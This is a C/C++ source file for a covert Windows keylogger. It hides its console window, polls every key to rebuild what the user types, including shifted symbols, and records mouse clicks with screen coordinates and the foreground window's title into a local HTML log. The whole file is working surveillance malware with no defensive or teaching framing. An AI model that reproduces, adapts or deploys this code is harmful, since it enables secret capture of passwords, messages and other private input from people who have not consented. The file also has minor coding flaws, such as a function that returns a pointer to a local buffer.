#define _CRT_SECURE_NO_WARNINGS
#include<stdio.h>
#include <windows.h>
int result = 0;
int keys[0xff] = {0};
int before[0xff] = {0};
int isUp = 0;
char k = 0;
int j = 0;
char ANSII[] = " !\"#$%&'()*+,./0123456789:;<=>?@ABCEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklnmopqrstuvwxyz{|}~";
char control[] = "←↑→↓";
char numup[] = ")!@#$%^&*(";//48-57
char right[][3] = { ";:","=+",",<","-_",".>","/?","`~"};//186-192
char lastright[][3] = { "[{","\\|","]}","'\"" };//219-222
char ckplus[][10] = {"Tab","Ctrl","Alt","Esc","PageUp","PageDown","End","Home","PrtSc","Insert","Delete","Win","浏览器","文件","计算器","锁屏","CapsLock","NumLock"};
char fnkeys[][4] = {"F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"};
char str[255] = "";
char strp[512] = "";
const char url[]="KeyBoardRecord.html";
POINT p;
FILE* file1_out_b;
int C2N(char c) {
	if (c >= '0' && c <= '9')
		return c - '0';
	if (c >= 'a' && c <= 'z')
		return c - 'a' + 10;
	if (c >= 'A' && c <= 'Z')
		return c - 'A' + 10;
}
int Number(char c[]) {
	int n = 0;
	int i = 0;
	while (c[i] != 0) {
		n *= 10;
		n += C2N(c[i]);
		i++;
	}
	return n;
}
char* String(int num, char* str, int radix = 10) {
	char index[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"; unsigned unum; int i = 0, j, k;
	if (radix == 10 && num < 0) { unum = (unsigned)-num; str[i++] = '-'; }
	else unum = (unsigned)num; do { str[i++] = index[unum % (unsigned)radix]; unum /= radix; } while (unum);
	str[i] = '\0'; if (str[0] == '-') k = 1; else k = 0; char temp;
	for (j = k; j <= (i - 1) / 2; j++) { temp = str[j]; str[j] = str[i - 1 + k - j]; str[i - 1 + k - j] = temp; }return str;
}
int length(char c[]) {
	int len = 0;
	for (int i = 0; i < 25585; i++) {
		if (c[i] == '\0')break;
		len++;
	}
	return len;
}
int length(const char c[]) {
	int len = 0;
	for (int i = 0; i < 25585; i++) {
		if (c[i] == '\0')break;
		len++;
	}
	return len;
}
void writeInFile(char c) {
	
	if ((file1_out_b = fopen(url, "ab+")) == NULL) {
		return;
	}
	if (fwrite(&c, sizeof(c), 1, file1_out_b) != 1) { }
	fclose(file1_out_b);
}
void writeInFile(char* c) {
	if ((file1_out_b = fopen(url, "a")) == NULL) {
		return;
	}
	fputs(c, file1_out_b);
	fclose(file1_out_b);
}
void writeInFile(const char *c) {
	if ((file1_out_b = fopen(url,"a")) == NULL) {
		return;
	}
	fputs(c, file1_out_b);
	fclose(file1_out_b);
}
void writeFile(const char* c) {
	if ((file1_out_b = fopen(url, "w")) == NULL) {
		return;
	}
	fputs(c, file1_out_b);
	fclose(file1_out_b);
}
void strlink(char* p, const char str[]) {
	int i = 0; int e = 0;
	while (1) {
		if (p[e] == '\0') { break; }
		e++;
	}
	while (1) {
		if (str[i] == '\0') { break; }
		p[e + i] = str[i];
		i++;
	}
	p[e + i ] = '\0';
}
int isKeyDown() {
	int isMsg = 0;
	for (int k = 0; k < 0xff; k++) {
		if (GetAsyncKeyState(k)) {
			isMsg = 1;
		}
	}
	return isMsg;
}//0 Null 1 Normalkey 2 ShiftWithKeydown 3 onlyShift
void reset() {
	for (int j = 0; j < 0xff; j++) {
		keys[j] = 0;
	}
}
void forewindowtitle() {
	DWORD dwProcess;
	DWORD dwSize = MAX_PATH;
	LRESULT lresult = 0;
	HWND hWnd = GetForegroundWindow();
	DWORD dwPID = GetWindowThreadProcessId(hWnd, &dwProcess);
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcess);
	WCHAR wszProcessPath[MAX_PATH] = { 0 }; 
	QueryFullProcessImageNameW(hProcess, 0, wszProcessPath, &dwSize); 
	CHAR Title[MAX_PATH] = { 0 }; 
	lresult = GetWindowTextA(hWnd, Title, MAX_PATH); 
	writeInFile(Title);
}
char * windowtitle() {
	DWORD dwProcess;
	DWORD dwSize = MAX_PATH;
	LRESULT lresult = 0;
	CHAR wszTitle[MAX_PATH] = { 0 };
	HWND hWnd = GetForegroundWindow();
	DWORD dwPID = GetWindowThreadProcessId(hWnd, &dwProcess);
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcess);
	WCHAR wszProcessPath[MAX_PATH] = { 0 };
	QueryFullProcessImageNameW(hProcess, 0, wszProcessPath, &dwSize);
	lresult = GetWindowTextA(hWnd, wszTitle, MAX_PATH);
	return wszTitle;
	//writeInFile(wszTitle);
}
void cktag(char* text) {
	strp[0] = '\0';
	strlink(strp,"<ck>");
	strlink(strp, text);
	strlink(strp,"</ck>");
	writeInFile(strp);
}
void out() {
	if (keys[160] || keys[161] || keys[160]) {
		isUp = 1;
	}
	else { isUp = 0; }
	if (keys[76] && keys[91]) {
		//writeInFile("<ck>锁屏</ck>");
		cktag(ckplus[15]);
	}
	if (keys[91]&&keys[76]==0) {
		//writeInFile("<ck>Win</ck>");
		cktag(ckplus[11]);
	}
	if (keys[17] || keys[162] || keys[163]) {
		//Ctrl
		cktag(ckplus[1]);;
	}
	if (keys[18] || keys[164] || keys[165]) {
		//writeInFile("<ck title=\"Ctrl\">Alt</ck>");
		cktag(ckplus[2]);
	}
	for (j = 0; j < 0xff; j++) {
		if (keys[j] == 1) {
			 k = j;
			if (j == 13) {
				writeInFile("<br/>\n");
			}
			if (j >= 48 && j <= 90) {
				if (j >= 58) {
					if (!isUp) { k += 'a'-'A'; }
				}
				if (j >= 48 && j <= 57) {
					if (isUp) { k = numup[j-48]; }
				}
				writeInFile(k);
			}
			if (j == 1) {
				GetCursorPos(&p);
				strp[0] = '\0';
				strlink(strp,"\n<leftkey style=\"top:");
				strlink(strp, String(p.y-10, str));
				strlink(strp,";left:");
				strlink(strp, String(p.x-10, str));
				strlink(strp, ";\" title=\"");
				strlink(strp,windowtitle());
				strlink(strp,"\"></leftkey>");
				writeInFile(strp);
			}
			if (j == 2) {
				GetCursorPos(&p);
				strp[0] = '\0';
				strlink(strp, "\n<rightkey style=\"top:");
				strlink(strp, String(p.y-10, str));
				strlink(strp, ";left:");
				strlink(strp, String(p.x-10, str));
				strlink(strp, ";\" title=\"");
				strlink(strp, windowtitle());
				strlink(strp, "\"></rightkey>");
				writeInFile(strp);
			}
			if (j == 8) {
				//printf("\b");
				writeInFile("<backspace title=\"退格\"></backspace>"); }
			if (j == 9) {
				//writeInFile("<ck title=\"Tab\">	</ck>");
				cktag(ckplus[0]);
			}
			if (j == 20) {
				cktag(ckplus[16]);
			}
			if (j == 144) {
				cktag(ckplus[17] );
			}
			if (j == 32) {
				writeInFile("<blankspace title=\"空格\"> </blankspace>");
			}
			if (j==27) {
				cktag(ckplus[3]);
			}
			if (j >= 33 && j <= 36) {
				cktag(ckplus[j-33+4]);
			}
			if (j >= 44 && j <= 46) {
				cktag(ckplus[j-44+8]);
			}
			if (j >= 37 && j <= 40) {
				strp[0] = control[2 * (j - 37)]; strp[1] = control[2 * (j - 37) + 1]; strp[2] = '\0';
				 writeInFile(strp);
			}
			if (j >= 112 && j <= 123) {
				cktag(fnkeys[j-112]);
			}
			if (j >= 182 && j <= 183) {
				cktag(ckplus[j-182+13]);
			}
			if (j == 172) {
				cktag(ckplus[12]);
			}
			if (j >= 186 && j <= 192) {
				if (isUp) {// printf("%c", right[j - 186][1]);
				writeInFile(right[j - 186][1]);
				}
				else { //printf("%c",right[j-186][0]); 
				writeInFile(right[j - 186][0]);
				}
			}
			if (j >= 219 && j <= 222) {
				if (isUp) {
			    writeInFile(lastright[j - 219][1]);
				}
				else {
				writeInFile(lastright[j - 219][0]);
				}
			}
				//printf("<%d>",j);
		}
	}
}
void update() {
	for (int k = 0; k < 0xff; k++) {
		if (GetAsyncKeyState(k)) {
			keys[k] = 1;
		}
	}
}
int isChanged() {
	for (int k = 0; k < 0xff; k++) {
		if (keys[k] != before[k]) {
			return 1;
		}
	}
	return 0;
}
void record() {
	for (int k = 0; k < 0xff; k++) {
		before[k] = keys[k];
	}
}
void hideConsole() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}
int main() {
	hideConsole();
	writeFile("<head><meta charset=\"ANSII\"><title>用户消息记录</title><style>\nleftkey, rightkey{display:block;position:absolute;border-radius:10px;width:20px;height:20px;}\nleftkey{background-color:#69d3f9;}rightkey{background-color:#ff0;}\nbackspace,blankspace{display:inline-block;background-color:#f7f7f7;width:20px;height:20px;}\nck{display:inline-block;background-color:#61ff00;height:18px;width:auto;margin:0 5px 0 5px;}\nleftkey:hover,rightkey:hover,backspace:hover,blankspace:hover,ck:hover{border:1px solid #ff0000;}\n</style></head>");
	update();
	while (1) {
		update();
		if (isChanged()) {
			out();
			result = 0;
		}
		else {
			result = 150;
		}
		record();
		reset();
		Sleep(result);
	}
	return result;
}